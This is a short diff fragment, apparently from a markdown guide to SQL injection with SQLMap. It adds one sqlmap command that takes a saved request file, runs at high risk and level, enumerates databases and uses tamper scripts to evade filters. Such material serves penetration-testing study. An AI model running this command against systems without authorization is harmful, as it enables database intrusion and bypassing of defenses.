@@ -168,3 +168,7 @@ An advanced Guide for SQL Injection (SQLi) using SQLMap👩‍💻:
 
 Uploaded By - @MADARA888UCHIHAA ⭐
 ```
+
+```
+sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash
+```
